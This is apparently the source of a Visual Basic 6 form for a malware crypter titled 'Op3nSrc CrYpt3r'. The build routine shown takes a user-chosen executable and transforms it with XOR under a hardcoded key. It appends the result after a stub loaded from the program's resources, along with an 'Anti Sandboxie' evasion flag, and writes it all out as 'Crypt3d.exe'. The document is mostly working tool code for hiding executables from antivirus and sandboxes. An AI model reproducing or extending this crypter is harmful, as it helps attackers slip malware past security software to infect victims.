VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "ComDlg32.OCX"
Begin VB.Form frm 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Op3nSrc CrYpt3r"
   ClientHeight    =   1695
   ClientLeft      =   6555
   ClientTop       =   8325
   ClientWidth     =   3825
   BeginProperty Font 
      Name            =   "Tw Cen MT Condensed Extra Bold"
      Size            =   9
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   -1  'True
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "frm.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   1695
   ScaleWidth      =   3825
   Begin MSComDlg.CommonDialog dlg2 
      Left            =   600
      Top             =   2400
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog dlg1 
      Left            =   120
      Top             =   2400
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin Op3nSrc.jcFrames jcFrames1 
      Height          =   1575
      Left            =   120
      Top             =   0
      Width           =   3615
      _ExtentX        =   6376
      _ExtentY        =   2778
      FrameColor      =   12829635
      Style           =   0
      Caption         =   "Op3nSrc CrYpt3r"
      TextColor       =   13579779
      Alignment       =   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Verdana"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ColorFrom       =   0
      ColorTo         =   0
      Begin VB.PictureBox Picture2 
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         Picture         =   "frm.frx":08CA
         ScaleHeight     =   255
         ScaleWidth      =   255
         TabIndex        =   1
         Top             =   720
         Width           =   255
      End
      Begin VB.PictureBox Picture1 
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         Picture         =   "frm.frx":0D0C
         ScaleHeight     =   255
         ScaleWidth      =   255
         TabIndex        =   0
         Top             =   240
         Width           =   255
      End
      Begin Op3nSrc.chameleonButton cmd_build 
         Height          =   330
         Left            =   1800
         TabIndex        =   2
         Top             =   1080
         Width           =   1695
         _ExtentX        =   2990
         _ExtentY        =   582
         BTYPE           =   3
         TX              =   "Build"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   -1  'True
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14935011
         BCOLO           =   14935011
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frm.frx":114E
         PICN            =   "frm.frx":116A
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Op3nSrc.chameleonButton cmd_add 
         Height          =   330
         Left            =   120
         TabIndex        =   3
         Top             =   1080
         Width           =   1575
         _ExtentX        =   2778
         _ExtentY        =   582
         BTYPE           =   3
         TX              =   "Browser"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   -1  'True
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14935011
         BCOLO           =   14935011
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frm.frx":15BC
         PICN            =   "frm.frx":15D8
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Op3nSrc.Check Chk1 
         Height          =   255
         Left            =   480
         TabIndex        =   4
         Top             =   720
         Width           =   2295
         _ExtentX        =   4048
         _ExtentY        =   450
         Value           =   1
         Caption         =   "Anti Sandboxie"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   -1  'True
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   0
         Caption         =   "Anti Sandboxie"
         BackColor       =   -2147483633
      End
      Begin Op3nSrc.wxpText txt1 
         Height          =   285
         Left            =   480
         TabIndex        =   5
         Top             =   240
         Width           =   3015
         _ExtentX        =   5318
         _ExtentY        =   503
         Text            =   "..."
         BackColor       =   16250871
         BackColor       =   16250871
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
   End
End
Attribute VB_Name = "frm"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Const sStr = "[///]"
Const sKEY = "WR$%#$^WR"
Dim cAnti    As String

Private Sub cmd_add_Click()
         
         With dlg1
         .DialogTitle = "Please Select Executable"
         .FileName = vbNullString
         .DefaultExt = "exe"
         .Filter = "Executables (*.exe)|*.exe|All Files (*.*)|*.*"
         .ShowOpen
         txt1.Text = .FileName
         End With

         
End Sub

Private Sub cmd_build_Click()

Dim sRd      As String
Dim sRes()   As Byte
Dim fSave    As String
Dim cD       As New mXOR

          If Chk1.Value = Checked Then cAnti = 1 Else:   cAnti = 0
          
          sRes() = LoadResData(101, "CUSTOM")
          If txt1.Text = "..." Then
          MsgBox "Please Select A File.", vbInformation
          Exit Sub
          Else
          End If
          If txt1.Text = vbNullString Then
          MsgBox "Please Select A File.", vbInformation
          Exit Sub
          Else
          End If
          
          Open txt1.Text For Binary Access Read As #1
          sRd = Space(LOF(1))
          Get #1, , sRd
          Close #1
          
          With dlg2
          .DialogTitle = "Select Output"
          .DefaultExt = "exe"
          .Filter = "Executables (*.exe)|*.exe|All Files (*.*)|*.*"
          .FileName = "Crypt3d.exe"
          .ShowSave
          fSave = .FileName
          End With
          
          If Dir$(fSave) <> "" Then Kill fSave
          
          Open fSave For Binary As #1
          Put #1, , sRes()
          Put #1, , sStr + cAnti + sStr
          Put #1, , cD.DecryptString(sRd, sKEY)
          Close #1
          
          MsgBox "DONE. !!!"
End Sub

Private Sub Form_Load()
      
      cAnti = 1
      
End Sub
